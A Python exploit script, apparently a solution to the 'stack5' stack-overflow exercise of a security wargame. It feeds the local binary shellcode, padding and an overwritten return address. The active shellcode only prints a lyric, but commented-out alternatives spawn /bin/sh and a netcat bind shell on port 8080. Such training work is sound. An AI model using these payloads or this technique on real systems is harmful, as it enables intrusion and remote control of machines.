#!/usr/bin/python

from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()
from struct import pack

BINARY_NAME = "stack5"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    # Linux/x86 - stdin re-open and /bin/sh exec Shellcode (39 bytes) - https://www.exploit-db.com/exploits/13357/
    # shellCode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    # Linux/x86 - netcat bindshell port 8080 Shellcode (75 bytes) - https://www.exploit-db.com/exploits/14332/
    # shellCode = "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23"
    shellCode = "\xeb\x13\x48\x31\xc0\xb0\x01\xbf\x01\x00\x00\x00\x5e\x48\x31\xd2\xb2\x29\x0f\x05\x90\xe8\xe8\xff\xff\xff\x54\x68\x61\x74\x20\x77\x65\x61\x76\x65\x20\x67\x6f\x74\x74\x61\x20\x67\x6f\x2e\x20\x50\x69\x6e\x6b\x20\x73\x6c\x69\x70\x2e\x20\x2d\x43\x61\x72\x64\x69\x20\x42\x0a\x00"
    payload = shellCode + ("\xCC" * (76 - shellCode.__len__())) + pack("I", 0xffffd290)
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # RUN IT
    commandList.append(absBinFilename)
    binary = Popen(commandList, env = currEnv, stdin = PIPE)
    if binary is not None:
        binary.communicate(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))

